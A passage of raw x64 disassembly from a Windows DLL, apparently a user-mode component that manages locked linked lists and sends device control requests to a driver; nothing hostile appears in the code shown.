   180001de3:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180001de8:	48 83 c4 20          	add    $0x20,%rsp
   180001dec:	41 5e                	pop    %r14
   180001dee:	5f                   	pop    %rdi
   180001def:	5e                   	pop    %rsi
   180001df0:	c3                   	ret
   180001df1:	cc                   	int3
   180001df2:	b9 03 00 00 00       	mov    $0x3,%ecx
   180001df7:	cd 29                	int    $0x29
   180001df9:	cc                   	int3
   180001dfa:	cc                   	int3
   180001dfb:	cc                   	int3
   180001dfc:	cc                   	int3
   180001dfd:	cc                   	int3
   180001dfe:	cc                   	int3
   180001dff:	cc                   	int3
   180001e00:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180001e05:	55                   	push   %rbp
   180001e06:	56                   	push   %rsi
   180001e07:	57                   	push   %rdi
   180001e08:	41 54                	push   %r12
   180001e0a:	41 56                	push   %r14
   180001e0c:	48 8b ec             	mov    %rsp,%rbp
   180001e0f:	48 83 ec 30          	sub    $0x30,%rsp
   180001e13:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   180001e17:	48 8b f1             	mov    %rcx,%rsi
   180001e1a:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   180001e1e:	4c 8d 25 7b ff 03 00 	lea    0x3ff7b(%rip),%r12        # 0x180041da0
   180001e25:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   180001e29:	49 8b cc             	mov    %r12,%rcx
   180001e2c:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   180001e30:	44 8b f2             	mov    %edx,%r14d
   180001e33:	33 ff                	xor    %edi,%edi
   180001e35:	48 ff 15 0c 90 03 00 	rex.W call *0x3900c(%rip)        # 0x18003ae48
   180001e3c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001e41:	ff 46 10             	incl   0x10(%rsi)
   180001e44:	4c 8d 0d f5 00 04 00 	lea    0x400f5(%rip),%r9        # 0x180041f40
   180001e4b:	44 31 76 14          	xor    %r14d,0x14(%rsi)
   180001e4f:	48 8b 0d ea 00 04 00 	mov    0x400ea(%rip),%rcx        # 0x180041f40
   180001e56:	eb 5a                	jmp    0x180001eb2
   180001e58:	48 8b c1             	mov    %rcx,%rax
   180001e5b:	48 8b 09             	mov    (%rcx),%rcx
   180001e5e:	48 39 70 38          	cmp    %rsi,0x38(%rax)
   180001e62:	75 4e                	jne    0x180001eb2
   180001e64:	41 0f ba e6 1e       	bt     $0x1e,%r14d
   180001e69:	72 06                	jb     0x180001e71
   180001e6b:	44 85 70 20          	test   %r14d,0x20(%rax)
   180001e6f:	74 41                	je     0x180001eb2
   180001e71:	48 39 41 08          	cmp    %rax,0x8(%rcx)
   180001e75:	0f 85 4a 01 00 00    	jne    0x180001fc5
   180001e7b:	48 8b 50 08          	mov    0x8(%rax),%rdx
   180001e7f:	48 39 02             	cmp    %rax,(%rdx)
   180001e82:	0f 85 3d 01 00 00    	jne    0x180001fc5
   180001e88:	48 89 0a             	mov    %rcx,(%rdx)
   180001e8b:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   180001e8f:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   180001e93:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   180001e97:	4c 39 02             	cmp    %r8,(%rdx)
   180001e9a:	0f 85 25 01 00 00    	jne    0x180001fc5
   180001ea0:	48 89 50 08          	mov    %rdx,0x8(%rax)
   180001ea4:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   180001ea8:	4c 89 00             	mov    %r8,(%rax)
   180001eab:	48 89 02             	mov    %rax,(%rdx)
   180001eae:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   180001eb2:	49 3b c9             	cmp    %r9,%rcx
   180001eb5:	75 a1                	jne    0x180001e58
   180001eb7:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   180001ebb:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
   180001ebf:	0f 84 89 00 00 00    	je     0x180001f4e
   180001ec5:	49 8b cc             	mov    %r12,%rcx
   180001ec8:	48 ff 15 59 8f 03 00 	rex.W call *0x38f59(%rip)        # 0x18003ae28
   180001ecf:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001ed4:	eb 5c                	jmp    0x180001f32
   180001ed6:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   180001eda:	48 39 43 08          	cmp    %rax,0x8(%rbx)
   180001ede:	0f 85 e1 00 00 00    	jne    0x180001fc5
   180001ee4:	48 8b 03             	mov    (%rbx),%rax
   180001ee7:	48 39 58 08          	cmp    %rbx,0x8(%rax)
   180001eeb:	0f 85 d4 00 00 00    	jne    0x180001fc5
   180001ef1:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   180001ef5:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180001ef9:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180001efd:	83 c8 ff             	or     $0xffffffff,%eax
   180001f00:	48 8b 53 38          	mov    0x38(%rbx),%rdx
   180001f04:	f0 0f c1 42 08       	lock xadd %eax,0x8(%rdx)
   180001f09:	83 f8 01             	cmp    $0x1,%eax
   180001f0c:	75 0c                	jne    0x180001f1a
   180001f0e:	48 8b 02             	mov    (%rdx),%rax
   180001f11:	48 8b ca             	mov    %rdx,%rcx
   180001f14:	ff 15 7e 8f 03 00    	call   *0x38f7e(%rip)        # 0x18003ae98
   180001f1a:	48 8b 0d 3f e9 03 00 	mov    0x3e93f(%rip),%rcx        # 0x180040860
   180001f21:	4c 8b c3             	mov    %rbx,%r8
   180001f24:	33 d2                	xor    %edx,%edx
   180001f26:	48 ff 15 73 8a 03 00 	rex.W call *0x38a73(%rip)        # 0x18003a9a0
   180001f2d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001f32:	48 8b 5d f0          	mov    -0x10(%rbp),%rbx
   180001f36:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   180001f3a:	48 3b d8             	cmp    %rax,%rbx
   180001f3d:	75 97                	jne    0x180001ed6
   180001f3f:	49 8b cc             	mov    %r12,%rcx
   180001f42:	48 ff 15 ff 8e 03 00 	rex.W call *0x38eff(%rip)        # 0x18003ae48
   180001f49:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001f4e:	48 8b 05 fb ff 03 00 	mov    0x3fffb(%rip),%rax        # 0x180041f50
   180001f55:	48 85 c0             	test   %rax,%rax
   180001f58:	0f 84 f8 00 00 00    	je     0x180002056
   180001f5e:	48 39 70 38          	cmp    %rsi,0x38(%rax)
   180001f62:	0f 85 ee 00 00 00    	jne    0x180002056
   180001f68:	44 85 70 20          	test   %r14d,0x20(%rax)
   180001f6c:	0f 84 e4 00 00 00    	je     0x180002056
   180001f72:	48 ff 15 5f 8b 03 00 	rex.W call *0x38b5f(%rip)        # 0x18003aad8
   180001f79:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001f7e:	8b c8                	mov    %eax,%ecx
   180001f80:	48 8b 05 c9 ff 03 00 	mov    0x3ffc9(%rip),%rax        # 0x180041f50
   180001f87:	39 48 30             	cmp    %ecx,0x30(%rax)
   180001f8a:	0f 84 c6 00 00 00    	je     0x180002056
   180001f90:	8b 0d 4a fe 03 00    	mov    0x3fe4a(%rip),%ecx        # 0x180041de0
   180001f96:	48 ff 15 33 8b 03 00 	rex.W call *0x38b33(%rip)        # 0x18003aad0
   180001f9d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001fa2:	48 89 45 30          	mov    %rax,0x30(%rbp)
   180001fa6:	48 8b d8             	mov    %rax,%rbx
   180001fa9:	48 85 c0             	test   %rax,%rax
   180001fac:	75 22                	jne    0x180001fd0
   180001fae:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   180001fb2:	e8 35 ce 00 00       	call   0x18000edec
   180001fb7:	85 c0                	test   %eax,%eax
   180001fb9:	74 11                	je     0x180001fcc
   180001fbb:	bf 08 00 00 00       	mov    $0x8,%edi
   180001fc0:	e9 98 00 00 00       	jmp    0x18000205d
   180001fc5:	b9 03 00 00 00       	mov    $0x3,%ecx
   180001fca:	cd 29                	int    $0x29
   180001fcc:	48 8b 5d 30          	mov    0x30(%rbp),%rbx
   180001fd0:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   180001fd4:	48 ff 15 e5 8b 03 00 	rex.W call *0x38be5(%rip)        # 0x18003abc0
   180001fdb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001fe0:	4c 8d 05 79 ff 03 00 	lea    0x3ff79(%rip),%r8        # 0x180041f60
   180001fe7:	8b d7                	mov    %edi,%edx
   180001fe9:	49 8b c0             	mov    %r8,%rax
   180001fec:	48 39 38             	cmp    %rdi,(%rax)
   180001fef:	74 0d                	je     0x180001ffe
   180001ff1:	ff c2                	inc    %edx
   180001ff3:	48 83 c0 08          	add    $0x8,%rax
   180001ff7:	83 fa 08             	cmp    $0x8,%edx
   180001ffa:	72 f0                	jb     0x180001fec
   180001ffc:	eb 0b                	jmp    0x180002009
   180001ffe:	48 8b 43 10          	mov    0x10(%rbx),%rax
   180002002:	48 63 ca             	movslq %edx,%rcx
   180002005:	49 89 04 c8          	mov    %rax,(%r8,%rcx,8)
   180002009:	83 fa 08             	cmp    $0x8,%edx
   18000200c:	74 ad                	je     0x180001fbb
   18000200e:	49 8b cc             	mov    %r12,%rcx
   180002011:	48 ff 15 10 8e 03 00 	rex.W call *0x38e10(%rip)        # 0x18003ae28
   180002018:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000201d:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   180002021:	83 ca ff             	or     $0xffffffff,%edx
   180002024:	48 ff 15 6d 8b 03 00 	rex.W call *0x38b6d(%rip)        # 0x18003ab98
   18000202b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002030:	49 8b cc             	mov    %r12,%rcx
   180002033:	8b d8                	mov    %eax,%ebx
   180002035:	48 ff 15 0c 8e 03 00 	rex.W call *0x38e0c(%rip)        # 0x18003ae48
   18000203c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002041:	83 fb ff             	cmp    $0xffffffff,%ebx
   180002044:	75 10                	jne    0x180002056
   180002046:	48 ff 15 03 89 03 00 	rex.W call *0x38903(%rip)        # 0x18003a950
   18000204d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002052:	8b f8                	mov    %eax,%edi
   180002054:	eb 07                	jmp    0x18000205d
   180002056:	44 31 76 14          	xor    %r14d,0x14(%rsi)
   18000205a:	ff 4e 10             	decl   0x10(%rsi)
   18000205d:	49 8b cc             	mov    %r12,%rcx
   180002060:	48 ff 15 c1 8d 03 00 	rex.W call *0x38dc1(%rip)        # 0x18003ae28
   180002067:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000206c:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   180002071:	8b c7                	mov    %edi,%eax
   180002073:	48 83 c4 30          	add    $0x30,%rsp
   180002077:	41 5e                	pop    %r14
   180002079:	41 5c                	pop    %r12
   18000207b:	5f                   	pop    %rdi
   18000207c:	5e                   	pop    %rsi
   18000207d:	5d                   	pop    %rbp
   18000207e:	c3                   	ret
   18000207f:	cc                   	int3
   180002080:	cc                   	int3
   180002081:	cc                   	int3
   180002082:	cc                   	int3
   180002083:	cc                   	int3
   180002084:	cc                   	int3
   180002085:	cc                   	int3
   180002086:	cc                   	int3
   180002087:	cc                   	int3
   180002088:	40 53                	rex push %rbx
   18000208a:	48 83 ec 20          	sub    $0x20,%rsp
   18000208e:	48 8b d9             	mov    %rcx,%rbx
   180002091:	48 8d 0d 08 fd 03 00 	lea    0x3fd08(%rip),%rcx        # 0x180041da0
   180002098:	48 ff 15 a9 8d 03 00 	rex.W call *0x38da9(%rip)        # 0x18003ae48
   18000209f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800020a4:	0f ba 6b 14 1f       	btsl   $0x1f,0x14(%rbx)
   1800020a9:	48 8d 0d f0 fc 03 00 	lea    0x3fcf0(%rip),%rcx        # 0x180041da0
   1800020b0:	ff 43 10             	incl   0x10(%rbx)
   1800020b3:	48 83 c4 20          	add    $0x20,%rsp
   1800020b7:	5b                   	pop    %rbx
   1800020b8:	48 ff 25 69 8d 03 00 	rex.W jmp *0x38d69(%rip)        # 0x18003ae28
   1800020bf:	cc                   	int3
   1800020c0:	cc                   	int3
   1800020c1:	cc                   	int3
   1800020c2:	cc                   	int3
   1800020c3:	cc                   	int3
   1800020c4:	cc                   	int3
   1800020c5:	cc                   	int3
   1800020c6:	cc                   	int3
   1800020c7:	cc                   	int3
   1800020c8:	cc                   	int3
   1800020c9:	cc                   	int3
   1800020ca:	cc                   	int3
   1800020cb:	cc                   	int3
   1800020cc:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800020d1:	55                   	push   %rbp
   1800020d2:	48 8d ac 24 20 fe ff 	lea    -0x1e0(%rsp),%rbp
   1800020d9:	ff 
   1800020da:	48 81 ec e0 02 00 00 	sub    $0x2e0,%rsp
   1800020e1:	48 8b 05 20 e0 03 00 	mov    0x3e020(%rip),%rax        # 0x180040108
   1800020e8:	48 33 c4             	xor    %rsp,%rax
   1800020eb:	48 89 85 d0 01 00 00 	mov    %rax,0x1d0(%rbp)
   1800020f2:	48 83 4c 24 60 ff    	orq    $0xffffffffffffffff,0x60(%rsp)
   1800020f8:	4c 8d 05 81 93 03 00 	lea    0x39381(%rip),%r8        # 0x18003b480
   1800020ff:	48 8b d9             	mov    %rcx,%rbx
   180002102:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002105:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   180002109:	ba 0a 02 00 00       	mov    $0x20a,%edx
   18000210e:	0f 11 44 24 78       	movups %xmm0,0x78(%rsp)
   180002113:	e8 20 0c 00 00       	call   0x180002d38
   180002118:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   18000211c:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   180002121:	48 ff 15 50 8d 03 00 	rex.W call *0x38d50(%rip)        # 0x18003ae78
   180002128:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000212d:	83 64 24 50 00       	andl   $0x0,0x50(%rsp)
   180002132:	48 8d 44 24 68       	lea    0x68(%rsp),%rax
   180002137:	48 83 64 24 48 00    	andq   $0x0,0x48(%rsp)
   18000213d:	4c 8d 4c 24 78       	lea    0x78(%rsp),%r9
   180002142:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   180002147:	4c 8d 45 88          	lea    -0x78(%rbp),%r8
   18000214b:	48 83 65 90 00       	andq   $0x0,-0x70(%rbp)
   180002150:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180002155:	48 89 45 98          	mov    %rax,-0x68(%rbp)
   180002159:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000215c:	b8 03 00 00 00       	mov    $0x3,%eax
   180002161:	c7 45 88 30 00 00 00 	movl   $0x30,-0x78(%rbp)
   180002168:	89 44 24 38          	mov    %eax,0x38(%rsp)
   18000216c:	ba 00 00 10 c0       	mov    $0xc0100000,%edx
   180002171:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180002175:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   18000217a:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   180002180:	c7 45 a0 40 00 00 00 	movl   $0x40,-0x60(%rbp)
   180002187:	f3 0f 7f 45 a8       	movdqu %xmm0,-0x58(%rbp)
   18000218c:	48 ff 15 dd 8c 03 00 	rex.W call *0x38cdd(%rip)        # 0x18003ae70
   180002193:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002198:	85 c0                	test   %eax,%eax
   18000219a:	78 08                	js     0x1800021a4
   18000219c:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1800021a1:	48 89 0b             	mov    %rcx,(%rbx)
   1800021a4:	48 8b 8d d0 01 00 00 	mov    0x1d0(%rbp),%rcx
   1800021ab:	48 33 cc             	xor    %rsp,%rcx
   1800021ae:	e8 3d 6b 03 00       	call   0x180038cf0
   1800021b3:	48 8b 9c 24 f8 02 00 	mov    0x2f8(%rsp),%rbx
   1800021ba:	00 
   1800021bb:	48 81 c4 e0 02 00 00 	add    $0x2e0,%rsp
   1800021c2:	5d                   	pop    %rbp
   1800021c3:	c3                   	ret
   1800021c4:	cc                   	int3
   1800021c5:	cc                   	int3
   1800021c6:	cc                   	int3
   1800021c7:	cc                   	int3
   1800021c8:	cc                   	int3
   1800021c9:	cc                   	int3
   1800021ca:	cc                   	int3
   1800021cb:	cc                   	int3
   1800021cc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800021d1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800021d6:	57                   	push   %rdi
   1800021d7:	48 83 ec 50          	sub    $0x50,%rsp
   1800021db:	48 8d 71 28          	lea    0x28(%rcx),%rsi
   1800021df:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800021e2:	48 8d 59 48          	lea    0x48(%rcx),%rbx
   1800021e6:	48 8b f9             	mov    %rcx,%rdi
   1800021e9:	0f 11 06             	movups %xmm0,(%rsi)
   1800021ec:	48 8b cb             	mov    %rbx,%rcx
   1800021ef:	33 d2                	xor    %edx,%edx
   1800021f1:	41 b8 00 22 00 00    	mov    $0x2200,%r8d
   1800021f7:	0f 11 46 10          	movups %xmm0,0x10(%rsi)
   1800021fb:	e8 fe 73 03 00       	call   0x1800395fe
   180002200:	48 8b 0d 01 fd 03 00 	mov    0x3fd01(%rip),%rcx        # 0x180041f08
   180002207:	48 8d 87 48 22 00 00 	lea    0x2248(%rdi),%rax
   18000220e:	c7 44 24 48 00 22 00 	movl   $0x2200,0x48(%rsp)
   180002215:	00 
   180002216:	4c 8b ce             	mov    %rsi,%r9
   180002219:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   18000221e:	45 33 c0             	xor    %r8d,%r8d
   180002221:	c7 44 24 38 28 00 00 	movl   $0x28,0x38(%rsp)
   180002228:	00 
   180002229:	33 d2                	xor    %edx,%edx
   18000222b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180002230:	c7 44 24 28 00 00 22 	movl   $0x220000,0x28(%rsp)
   180002237:	00 
   180002238:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   18000223d:	48 ff 15 24 8c 03 00 	rex.W call *0x38c24(%rip)        # 0x18003ae68
   180002244:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002249:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   18000224e:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   180002253:	48 83 c4 50          	add    $0x50,%rsp
   180002257:	5f                   	pop    %rdi
   180002258:	c3                   	ret
   180002259:	cc                   	int3
   18000225a:	cc                   	int3
   18000225b:	cc                   	int3
   18000225c:	cc                   	int3
   18000225d:	cc                   	int3
   18000225e:	cc                   	int3
   18000225f:	cc                   	int3
   180002260:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002265:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000226a:	57                   	push   %rdi
   18000226b:	48 83 ec 20          	sub    $0x20,%rsp
   18000226f:	48 8b d9             	mov    %rcx,%rbx
   180002272:	33 ff                	xor    %edi,%edi
   180002274:	48 8d 0d 65 fc 03 00 	lea    0x3fc65(%rip),%rcx        # 0x180041ee0
   18000227b:	48 ff 15 36 89 03 00 	rex.W call *0x38936(%rip)        # 0x18003abb8
   180002282:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002287:	ff 0d 2f fc 03 00    	decl   0x3fc2f(%rip)        # 0x180041ebc
   18000228d:	39 3d bd e5 03 00    	cmp    %edi,0x3e5bd(%rip)        # 0x180040850
   180002293:	75 49                	jne    0x1800022de
   180002295:	48 8b 0d c4 e5 03 00 	mov    0x3e5c4(%rip),%rcx        # 0x180040860
   18000229c:	4c 8b c3             	mov    %rbx,%r8
   18000229f:	33 d2                	xor    %edx,%edx
   1800022a1:	48 ff 15 f8 86 03 00 	rex.W call *0x386f8(%rip)        # 0x18003a9a0
   1800022a8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800022ad:	39 3d 05 fc 03 00    	cmp    %edi,0x3fc05(%rip)        # 0x180041eb8
   1800022b3:	0f 85 a6 00 00 00    	jne    0x18000235f
   1800022b9:	39 3d fd fb 03 00    	cmp    %edi,0x3fbfd(%rip)        # 0x180041ebc
   1800022bf:	0f 85 9a 00 00 00    	jne    0x18000235f
   1800022c5:	48 8b 05 5c fc 03 00 	mov    0x3fc5c(%rip),%rax        # 0x180041f28
   1800022cc:	8d 77 01             	lea    0x1(%rdi),%esi
   1800022cf:	48 39 05 4a fc 03 00 	cmp    %rax,0x3fc4a(%rip)        # 0x180041f20
   1800022d6:	0f 44 fe             	cmove  %esi,%edi
   1800022d9:	e9 81 00 00 00       	jmp    0x18000235f
   1800022de:	48 8b 05 e3 fb 03 00 	mov    0x3fbe3(%rip),%rax        # 0x180041ec8
   1800022e5:	48 8d 0d d4 fb 03 00 	lea    0x3fbd4(%rip),%rcx        # 0x180041ec0
   1800022ec:	48 39 08             	cmp    %rcx,(%rax)
   1800022ef:	0f 85 97 00 00 00    	jne    0x18000238c
   1800022f5:	48 89 43 08          	mov    %rax,0x8(%rbx)
   1800022f9:	be 01 00 00 00       	mov    $0x1,%esi
   1800022fe:	01 35 b4 fb 03 00    	add    %esi,0x3fbb4(%rip)        # 0x180041eb8
   180002304:	48 89 0b             	mov    %rcx,(%rbx)
   180002307:	48 8b cb             	mov    %rbx,%rcx
   18000230a:	48 89 18             	mov    %rbx,(%rax)
   18000230d:	48 8b 05 0c fc 03 00 	mov    0x3fc0c(%rip),%rax        # 0x180041f20
   180002314:	48 89 1d ad fb 03 00 	mov    %rbx,0x3fbad(%rip)        # 0x180041ec8
   18000231b:	48 89 43 10          	mov    %rax,0x10(%rbx)
   18000231f:	48 03 c6             	add    %rsi,%rax
   180002322:	48 89 05 f7 fb 03 00 	mov    %rax,0x3fbf7(%rip)        # 0x180041f20
   180002329:	e8 9e fe ff ff       	call   0x1800021cc
   18000232e:	85 c0                	test   %eax,%eax
   180002330:	74 2d                	je     0x18000235f
   180002332:	3d 03 01 00 00       	cmp    $0x103,%eax
   180002337:	74 26                	je     0x18000235f
   180002339:	48 8b 03             	mov    (%rbx),%rax
   18000233c:	48 39 58 08          	cmp    %rbx,0x8(%rax)
   180002340:	75 4a                	jne    0x18000238c
   180002342:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   180002346:	48 39 1a             	cmp    %rbx,(%rdx)
   180002349:	75 41                	jne    0x18000238c
   18000234b:	ff 0d 67 fb 03 00    	decl   0x3fb67(%rip)        # 0x180041eb8
   180002351:	48 29 35 c8 fb 03 00 	sub    %rsi,0x3fbc8(%rip)        # 0x180041f20
   180002358:	48 89 02             	mov    %rax,(%rdx)
   18000235b:	48 89 50 08          	mov    %rdx,0x8(%rax)
   18000235f:	48 8d 0d 7a fb 03 00 	lea    0x3fb7a(%rip),%rcx        # 0x180041ee0
   180002366:	48 ff 15 43 88 03 00 	rex.W call *0x38843(%rip)        # 0x18003abb0
   18000236d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002372:	85 ff                	test   %edi,%edi
   180002374:	74 05                	je     0x18000237b
   180002376:	e8 09 07 00 00       	call   0x180002a84
   18000237b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002380:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180002385:	48 83 c4 20          	add    $0x20,%rsp
   180002389:	5f                   	pop    %rdi
   18000238a:	c3                   	ret
   18000238b:	cc                   	int3
   18000238c:	b9 03 00 00 00       	mov    $0x3,%ecx
   180002391:	cd 29                	int    $0x29
   180002393:	cc                   	int3
   180002394:	cc                   	int3
   180002395:	cc                   	int3
   180002396:	cc                   	int3
   180002397:	cc                   	int3
   180002398:	cc                   	int3
   180002399:	cc                   	int3
   18000239a:	cc                   	int3
   18000239b:	cc                   	int3
   18000239c:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   1800023a0:	53                   	push   %rbx
   1800023a1:	48 83 ec 60          	sub    $0x60,%rsp
   1800023a5:	83 3d a8 e4 03 00 00 	cmpl   $0x0,0x3e4a8(%rip)        # 0x180040854
   1800023ac:	0f 84 f3 00 00 00    	je     0x1800024a5
   1800023b2:	8b 0d 28 fa 03 00    	mov    0x3fa28(%rip),%ecx        # 0x180041de0
   1800023b8:	48 ff 15 11 87 03 00 	rex.W call *0x38711(%rip)        # 0x18003aad0
   1800023bf:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800023c4:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   1800023c9:	48 85 c0             	test   %rax,%rax
   1800023cc:	75 17                	jne    0x1800023e5
   1800023ce:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   1800023d3:	e8 14 ca 00 00       	call   0x18000edec
   1800023d8:	85 c0                	test   %eax,%eax
   1800023da:	0f 85 c5 00 00 00    	jne    0x1800024a5
   1800023e0:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   1800023e5:	48 8b 58 10          	mov    0x10(%rax),%rbx
   1800023e9:	48 8b cb             	mov    %rbx,%rcx
   1800023ec:	48 ff 15 cd 87 03 00 	rex.W call *0x387cd(%rip)        # 0x18003abc0
   1800023f3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800023f8:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800023fb:	48 8d 0d de fa 03 00 	lea    0x3fade(%rip),%rcx        # 0x180041ee0
   180002402:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   180002407:	c7 44 24 50 03 01 00 	movl   $0x103,0x50(%rsp)
   18000240e:	00 
   18000240f:	48 ff 15 a2 87 03 00 	rex.W call *0x387a2(%rip)        # 0x18003abb8
   180002416:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000241b:	83 3d 2e e4 03 00 00 	cmpl   $0x0,0x3e42e(%rip)        # 0x180040850
   180002422:	74 6e                	je     0x180002492
   180002424:	83 64 24 48 00       	andl   $0x0,0x48(%rsp)
   180002429:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   18000242e:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   180002434:	45 33 c9             	xor    %r9d,%r9d
   180002437:	48 8b 0d ca fa 03 00 	mov    0x3faca(%rip),%rcx        # 0x180041f08
   18000243e:	45 33 c0             	xor    %r8d,%r8d
   180002441:	c7 44 24 38 04 00 00 	movl   $0x4,0x38(%rsp)
   180002448:	00 
   180002449:	48 8b d3             	mov    %rbx,%rdx
   18000244c:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180002451:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   180002456:	c7 44 24 28 2c 00 22 	movl   $0x22002c,0x28(%rsp)
   18000245d:	00 
   18000245e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002463:	48 ff 15 fe 89 03 00 	rex.W call *0x389fe(%rip)        # 0x18003ae68
   18000246a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000246f:	3d 03 01 00 00       	cmp    $0x103,%eax
   180002474:	75 15                	jne    0x18000248b
   180002476:	45 33 c0             	xor    %r8d,%r8d
   180002479:	83 ca ff             	or     $0xffffffff,%edx
   18000247c:	48 8b cb             	mov    %rbx,%rcx
   18000247f:	48 ff 15 4a 87 03 00 	rex.W call *0x3874a(%rip)        # 0x18003abd0
   180002486:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000248b:	83 25 be e3 03 00 00 	andl   $0x0,0x3e3be(%rip)        # 0x180040850
   180002492:	48 8d 0d 47 fa 03 00 	lea    0x3fa47(%rip),%rcx        # 0x180041ee0
   180002499:	48 ff 15 10 87 03 00 	rex.W call *0x38710(%rip)        # 0x18003abb0
   1800024a0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800024a5:	48 83 c4 60          	add    $0x60,%rsp
   1800024a9:	5b                   	pop    %rbx
   1800024aa:	c3                   	ret
   1800024ab:	cc                   	int3
   1800024ac:	cc                   	int3
   1800024ad:	cc                   	int3
   1800024ae:	cc                   	int3
   1800024af:	cc                   	int3
   1800024b0:	cc                   	int3
   1800024b1:	cc                   	int3
   1800024b2:	cc                   	int3
   1800024b3:	cc                   	int3
   1800024b4:	cc                   	int3
   1800024b5:	cc                   	int3
   1800024b6:	cc                   	int3
   1800024b7:	cc                   	int3
   1800024b8:	cc                   	int3
   1800024b9:	cc                   	int3
   1800024ba:	cc                   	int3
   1800024bb:	cc                   	int3
   1800024bc:	cc                   	int3
   1800024bd:	cc                   	int3
   1800024be:	cc                   	int3
   1800024bf:	cc                   	int3
   1800024c0:	48 8b c4             	mov    %rsp,%rax
   1800024c3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1800024c7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1800024cb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1800024cf:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1800024d3:	41 57                	push   %r15
   1800024d5:	48 83 ec 20          	sub    $0x20,%rsp
   1800024d9:	8b f9                	mov    %ecx,%edi
   1800024db:	48 8d 5a e0          	lea    -0x20(%rdx),%rbx
   1800024df:	48 8d 0d fa f9 03 00 	lea    0x3f9fa(%rip),%rcx        # 0x180041ee0
   1800024e6:	41 8b f1             	mov    %r9d,%esi
   1800024e9:	33 ed                	xor    %ebp,%ebp
